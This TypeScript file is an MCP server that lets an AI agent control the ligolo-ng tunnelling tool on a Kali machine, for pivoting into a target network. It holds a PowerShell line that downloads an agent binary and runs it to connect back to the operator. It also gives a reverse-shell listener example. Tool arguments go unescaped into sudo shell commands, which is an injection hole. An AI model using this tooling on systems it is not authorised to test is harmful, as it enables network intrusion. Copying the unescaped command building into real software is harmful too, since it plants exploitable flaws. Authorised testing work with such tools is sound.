#!/usr/bin/env node

import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
  Tool,
} from "@modelcontextprotocol/sdk/types.js";
import { exec, spawn, ChildProcess } from "child_process";
import { promisify } from "util";

const execAsync = promisify(exec);

// Configuration
const KALI_HOST = process.env.KALI_HOST || "kali";
const PROXY_PORT = process.env.LIGOLO_PROXY_PORT || "11601";
const API_PORT = process.env.LIGOLO_API_PORT || "8080";
const DEFAULT_INTERFACE = process.env.LIGOLO_INTERFACE || "ligolo";

// State tracking
interface ProxyState {
  running: boolean;
  pid?: number;
  process?: ChildProcess;
  selfcert: boolean;
  apiEnabled: boolean;
}

let proxyState: ProxyState = {
  running: false,
  selfcert: true,
  apiEnabled: false,
};

// Helper function to execute commands on Kali
async function sshExec(command: string): Promise<{ stdout: string; stderr: string }> {
  const sshCommand = `ssh ${KALI_HOST} "${command.replace(/"/g, '\\"')}"`;
  return execAsync(sshCommand, { timeout: 30000 });
}

// Helper to check if ligolo-proxy is running on Kali
async function checkProxyRunning(): Promise<boolean> {
  try {
    const { stdout } = await sshExec("pgrep -f ligolo-proxy");
    return stdout.trim().length > 0;
  } catch {
    return false;
  }
}

// Define tools
const tools: Tool[] = [
  {
    name: "ligolo_proxy_start",
    description: "Start the ligolo-ng proxy server on Kali. The proxy accepts agent connections and manages tunnels.",
    inputSchema: {
      type: "object" as const,
      properties: {
        selfcert: {
          type: "boolean",
          description: "Use self-signed certificates (default: true)",
          default: true,
        },
        port: {
          type: "string",
          description: "Port for agents to connect (default: 11601)",
          default: "11601",
        },
        enableApi: {
          type: "boolean",
          description: "Enable the web API for remote control",
          default: false,
        },
        apiPort: {
          type: "string",
          description: "Port for the web API (default: 8080)",
          default: "8080",
        },
        daemonMode: {
          type: "boolean",
          description: "Run proxy in daemon/background mode",
          default: true,
        },
      },
      required: [],
    },
  },
  {
    name: "ligolo_proxy_stop",
    description: "Stop the running ligolo-ng proxy server on Kali",
    inputSchema: {
      type: "object" as const,
      properties: {},
      required: [],
    },
  },
  {
    name: "ligolo_proxy_status",
    description: "Check the status of the ligolo-ng proxy server",
    inputSchema: {
      type: "object" as const,
      properties: {},
      required: [],
    },
  },
  {
    name: "ligolo_agents_list",
    description: "List all connected agents to the ligolo-ng proxy",
    inputSchema: {
      type: "object" as const,
      properties: {},
      required: [],
    },
  },
  {
    name: "ligolo_session_select",
    description: "Select an agent session to work with",
    inputSchema: {
      type: "object" as const,
      properties: {
        sessionId: {
          type: "number",
          description: "Session ID number to select (from agents list)",
        },
      },
      required: ["sessionId"],
    },
  },
  {
    name: "ligolo_interface_create",
    description: "Create a TUN interface for ligolo-ng tunneling",
    inputSchema: {
      type: "object" as const,
      properties: {
        name: {
          type: "string",
          description: "Name of the TUN interface to create",
          default: "ligolo",
        },
      },
      required: [],
    },
  },
  {
    name: "ligolo_interface_list",
    description: "List all TUN interfaces on Kali",
    inputSchema: {
      type: "object" as const,
      properties: {},
      required: [],
    },
  },
  {
    name: "ligolo_tunnel_start",
    description: "Start a tunnel through a selected agent session",
    inputSchema: {
      type: "object" as const,
      properties: {
        tun: {
          type: "string",
          description: "TUN interface name to use",
          default: "ligolo",
        },
      },
      required: [],
    },
  },
  {
    name: "ligolo_tunnel_stop",
    description: "Stop the active tunnel",
    inputSchema: {
      type: "object" as const,
      properties: {},
      required: [],
    },
  },
  {
    name: "ligolo_route_add",
    description: "Add a route to access the agent's network through the tunnel",
    inputSchema: {
      type: "object" as const,
      properties: {
        network: {
          type: "string",
          description: "Network CIDR to route (e.g., 10.10.10.0/24)",
        },
        interface: {
          type: "string",
          description: "TUN interface name",
          default: "ligolo",
        },
      },
      required: ["network"],
    },
  },
  {
    name: "ligolo_route_delete",
    description: "Delete a route from the routing table",
    inputSchema: {
      type: "object" as const,
      properties: {
        network: {
          type: "string",
          description: "Network CIDR to remove from routes",
        },
      },
      required: ["network"],
    },
  },
  {
    name: "ligolo_route_list",
    description: "List all routes configured for ligolo interfaces",
    inputSchema: {
      type: "object" as const,
      properties: {},
      required: [],
    },
  },
  {
    name: "ligolo_listener_add",
    description: "Add a listener on the agent to forward ports back to the attacker",
    inputSchema: {
      type: "object" as const,
      properties: {
        localAddress: {
          type: "string",
          description: "Local address to listen on (e.g., 0.0.0.0:4444)",
        },
        remoteAddress: {
          type: "string",
          description: "Remote address to forward to (e.g., 127.0.0.1:4444 on Kali)",
        },
      },
      required: ["localAddress", "remoteAddress"],
    },
  },
  {
    name: "ligolo_listener_list",
    description: "List all active listeners",
    inputSchema: {
      type: "object" as const,
      properties: {},
      required: [],
    },
  },
  {
    name: "ligolo_listener_delete",
    description: "Delete a listener",
    inputSchema: {
      type: "object" as const,
      properties: {
        listenerId: {
          type: "number",
          description: "ID of the listener to delete",
        },
      },
      required: ["listenerId"],
    },
  },
  {
    name: "ligolo_agent_info",
    description: "Get network information from the selected agent (ifconfig)",
    inputSchema: {
      type: "object" as const,
      properties: {},
      required: [],
    },
  },
  {
    name: "ligolo_certificate_fingerprint",
    description: "Get the certificate fingerprint for agent verification",
    inputSchema: {
      type: "object" as const,
      properties: {},
      required: [],
    },
  },
  {
    name: "ligolo_agent_command",
    description: "Generate the agent command to run on target machines",
    inputSchema: {
      type: "object" as const,
      properties: {
        proxyIp: {
          type: "string",
          description: "IP address of the proxy server (Kali)",
        },
        port: {
          type: "string",
          description: "Port the proxy is listening on",
          default: "11601",
        },
        ignoreCert: {
          type: "boolean",
          description: "Ignore certificate verification (for self-signed)",
          default: true,
        },
        fingerprint: {
          type: "string",
          description: "Certificate fingerprint for verification (optional)",
        },
        useWs: {
          type: "boolean",
          description: "Use WebSocket transport",
          default: false,
        },
        retry: {
          type: "boolean",
          description: "Auto-retry on connection error",
          default: true,
        },
      },
      required: ["proxyIp"],
    },
  },
  {
    name: "ligolo_send_command",
    description: "Send a raw command to the ligolo-ng proxy console (advanced)",
    inputSchema: {
      type: "object" as const,
      properties: {
        command: {
          type: "string",
          description: "Raw command to send to ligolo-ng console",
        },
      },
      required: ["command"],
    },
  },
];

// Tool handlers
async function handleToolCall(
  name: string,
  args: Record<string, unknown>
): Promise<string> {
  switch (name) {
    case "ligolo_proxy_start": {
      const isRunning = await checkProxyRunning();
      if (isRunning) {
        return "Ligolo-ng proxy is already running on Kali";
      }

      const selfcert = args.selfcert !== false;
      const port = (args.port as string) || PROXY_PORT;
      const enableApi = args.enableApi === true;
      const apiPort = (args.apiPort as string) || API_PORT;
      const daemonMode = args.daemonMode !== false;

      let cmd = "ligolo-proxy";
      if (selfcert) cmd += " -selfcert";
      cmd += ` -laddr 0.0.0.0:${port}`;

      if (enableApi) {
        cmd += ` -api -api-addr 0.0.0.0:${apiPort}`;
      }

      if (daemonMode) {
        cmd = `nohup ${cmd} > /tmp/ligolo-proxy.log 2>&1 &`;
      }

      try {
        await sshExec(cmd);
        await new Promise((resolve) => setTimeout(resolve, 2000)); // Wait for startup

        const running = await checkProxyRunning();
        if (running) {
          proxyState.running = true;
          proxyState.selfcert = selfcert;
          proxyState.apiEnabled = enableApi;

          return `Ligolo-ng proxy started successfully on Kali
- Listening on: 0.0.0.0:${port}
- Self-signed cert: ${selfcert}
- API enabled: ${enableApi}${enableApi ? ` (port ${apiPort})` : ""}
- Daemon mode: ${daemonMode}

Agents can connect using:
./agent -connect <kali-ip>:${port}${selfcert ? " -ignore-cert" : ""}`;
        } else {
          return "Failed to start ligolo-ng proxy. Check if it's installed on Kali.";
        }
      } catch (error) {
        return `Error starting proxy: ${error instanceof Error ? error.message : String(error)}`;
      }
    }

    case "ligolo_proxy_stop": {
      try {
        await sshExec("pkill -f ligolo-proxy");
        proxyState.running = false;
        return "Ligolo-ng proxy stopped successfully";
      } catch (error) {
        return `Error stopping proxy: ${error instanceof Error ? error.message : String(error)}`;
      }
    }

    case "ligolo_proxy_status": {
      try {
        const running = await checkProxyRunning();
        if (running) {
          const { stdout: pid } = await sshExec("pgrep -f ligolo-proxy");
          const { stdout: log } = await sshExec("tail -20 /tmp/ligolo-proxy.log 2>/dev/null || echo 'No log available'");

          return `Ligolo-ng proxy status: RUNNING
PID: ${pid.trim()}

Recent log output:
${log}`;
        } else {
          return "Ligolo-ng proxy status: NOT RUNNING";
        }
      } catch (error) {
        return `Error checking status: ${error instanceof Error ? error.message : String(error)}`;
      }
    }

    case "ligolo_agents_list": {
      // This would ideally use the API if enabled, otherwise parse log
      try {
        const { stdout } = await sshExec("tail -100 /tmp/ligolo-proxy.log 2>/dev/null | grep -E 'Agent joined|session' || echo 'No agents found in log'");
        return `Connected Agents (from log):
${stdout}

Note: For real-time agent listing, enable the API with ligolo_proxy_start --enableApi`;
      } catch (error) {
        return `Error listing agents: ${error instanceof Error ? error.message : String(error)}`;
      }
    }

    case "ligolo_session_select": {
      const sessionId = args.sessionId as number;
      // Would need interactive console or API access
      return `Session selection requires interactive access.

Use screen/tmux to interact with ligolo-ng proxy directly, or enable the API.

Command to run manually on Kali:
  session
  (select session ${sessionId})`;
    }

    case "ligolo_interface_create": {
      const ifaceName = (args.name as string) || DEFAULT_INTERFACE;
      try {
        // Create TUN interface on Kali
        await sshExec(`sudo ip tuntap add user root mode tun ${ifaceName}`);
        await sshExec(`sudo ip link set ${ifaceName} up`);

        return `TUN interface '${ifaceName}' created and brought up on Kali.

Next steps:
1. Select an agent session
2. Add routes: ligolo_route_add --network <target-network>
3. Start tunnel: ligolo_tunnel_start --tun ${ifaceName}`;
      } catch (error) {
        // Interface might already exist
        const errMsg = error instanceof Error ? error.message : String(error);
        if (errMsg.includes("File exists")) {
          return `Interface '${ifaceName}' already exists. Use ligolo_interface_list to view interfaces.`;
        }
        return `Error creating interface: ${errMsg}`;
      }
    }

    case "ligolo_interface_list": {
      try {
        const { stdout } = await sshExec("ip link show type tun");
        return `TUN Interfaces on Kali:
${stdout || "No TUN interfaces found"}`;
      } catch (error) {
        return `Error listing interfaces: ${error instanceof Error ? error.message : String(error)}`;
      }
    }

    case "ligolo_tunnel_start": {
      const tun = (args.tun as string) || DEFAULT_INTERFACE;
      return `To start the tunnel, run in the ligolo-ng console:

  tunnel_start --tun ${tun}

Note: This requires an active session to be selected first.
For automation, use the ligolo-ng API.`;
    }

    case "ligolo_tunnel_stop": {
      return `To stop the tunnel, run in the ligolo-ng console:

  tunnel_stop

Or simply select a different session.`;
    }

    case "ligolo_route_add": {
      const network = args.network as string;
      const iface = (args.interface as string) || DEFAULT_INTERFACE;

      if (!network) {
        return "Error: network parameter is required (e.g., 10.10.10.0/24)";
      }

      try {
        await sshExec(`sudo ip route add ${network} dev ${iface}`);
        return `Route added: ${network} via interface ${iface}

You can now access hosts on ${network} through the ligolo tunnel.
Make sure the tunnel is started with: tunnel_start --tun ${iface}`;
      } catch (error) {
        const errMsg = error instanceof Error ? error.message : String(error);
        if (errMsg.includes("File exists")) {
          return `Route to ${network} already exists.`;
        }
        return `Error adding route: ${errMsg}`;
      }
    }

    case "ligolo_route_delete": {
      const network = args.network as string;

      if (!network) {
        return "Error: network parameter is required";
      }

      try {
        await sshExec(`sudo ip route del ${network}`);
        return `Route to ${network} deleted successfully`;
      } catch (error) {
        return `Error deleting route: ${error instanceof Error ? error.message : String(error)}`;
      }
    }

    case "ligolo_route_list": {
      try {
        const { stdout } = await sshExec(`ip route show | grep -E '${DEFAULT_INTERFACE}|ligolo|tun'`);
        return `Ligolo routes:
${stdout || "No ligolo routes found"}`;
      } catch (error) {
        return `Error listing routes: ${error instanceof Error ? error.message : String(error)}`;
      }
    }

    case "ligolo_listener_add": {
      const local = args.localAddress as string;
      const remote = args.remoteAddress as string;

      return `To add a listener, run in the ligolo-ng console:

  listener_add --addr ${local} --to ${remote}

This will:
- Listen on ${local} on the agent machine
- Forward connections to ${remote} (typically your Kali machine)

Example use case: Reverse shell callback
  listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444`;
    }

    case "ligolo_listener_list": {
      return `To list listeners, run in the ligolo-ng console:

  listener_list

For API access, enable it when starting the proxy.`;
    }

    case "ligolo_listener_delete": {
      const listenerId = args.listenerId as number;
      return `To delete a listener, run in the ligolo-ng console:

  listener_delete ${listenerId}`;
    }

    case "ligolo_agent_info": {
      return `To get agent network info, run in the ligolo-ng console after selecting a session:

  ifconfig

This will show the agent's network interfaces and IP addresses.`;
    }

    case "ligolo_certificate_fingerprint": {
      try {
        const { stdout } = await sshExec("grep -i fingerprint /tmp/ligolo-proxy.log | tail -1 || echo 'Fingerprint not found in log'");
        return `Certificate Fingerprint:
${stdout}

Use this fingerprint with the agent's -accept-fingerprint option for secure connections.`;
      } catch (error) {
        return `Error getting fingerprint: ${error instanceof Error ? error.message : String(error)}`;
      }
    }

    case "ligolo_agent_command": {
      const proxyIp = args.proxyIp as string;
      const port = (args.port as string) || PROXY_PORT;
      const ignoreCert = args.ignoreCert !== false;
      const fingerprint = args.fingerprint as string;
      const useWs = args.useWs === true;
      const retry = args.retry !== false;

      let cmd = `./agent -connect ${proxyIp}:${port}`;

      if (fingerprint) {
        cmd += ` -accept-fingerprint ${fingerprint}`;
      } else if (ignoreCert) {
        cmd += " -ignore-cert";
      }

      if (useWs) {
        cmd += " -ws";
      }

      if (retry) {
        cmd += " -retry";
      }

      const windowsCmd = cmd.replace("./agent", ".\\agent.exe");

      return `Ligolo-ng Agent Commands:

Linux/Mac:
  ${cmd}

Windows:
  ${windowsCmd}

PowerShell (download and run):
  Invoke-WebRequest -Uri "http://${proxyIp}:8000/agent.exe" -OutFile agent.exe; .\\agent.exe -connect ${proxyIp}:${port}${ignoreCert ? " -ignore-cert" : ""}${retry ? " -retry" : ""}

Notes:
- Make sure the agent binary is transferred to the target
- Use -retry for automatic reconnection
- Use -ignore-cert only in testing (fingerprint verification is more secure)`;
    }

    case "ligolo_send_command": {
      const command = args.command as string;
      return `To send command "${command}" to ligolo-ng:

Option 1: Use screen/tmux session
  screen -S ligolo
  (send command: ${command})

Option 2: Use the API (if enabled)
  curl -X POST http://kali:8080/api/command -d '{"command": "${command}"}'

Option 3: Direct console access via SSH
  ssh kali -t "screen -r ligolo"`;
    }

    default:
      return `Unknown tool: ${name}`;
  }
}

// Create and run server
async function main() {
  const server = new Server(
    {
      name: "ligolo-ng-mcp",
      version: "1.0.0",
    },
    {
      capabilities: {
        tools: {},
      },
    }
  );

  // List tools handler
  server.setRequestHandler(ListToolsRequestSchema, async () => {
    return { tools };
  });

  // Call tool handler
  server.setRequestHandler(CallToolRequestSchema, async (request) => {
    const { name, arguments: args } = request.params;

    try {
      const result = await handleToolCall(name, args as Record<string, unknown> || {});
      return {
        content: [
          {
            type: "text" as const,
            text: result,
          },
        ],
      };
    } catch (error) {
      return {
        content: [
          {
            type: "text" as const,
            text: `Error executing ${name}: ${error instanceof Error ? error.message : String(error)}`,
          },
        ],
        isError: true,
      };
    }
  });

  // Connect to transport
  const transport = new StdioServerTransport();
  await server.connect(transport);

  console.error("Ligolo-ng MCP server running on stdio");
}

main().catch((error) => {
  console.error("Fatal error:", error);
  process.exit(1);
});
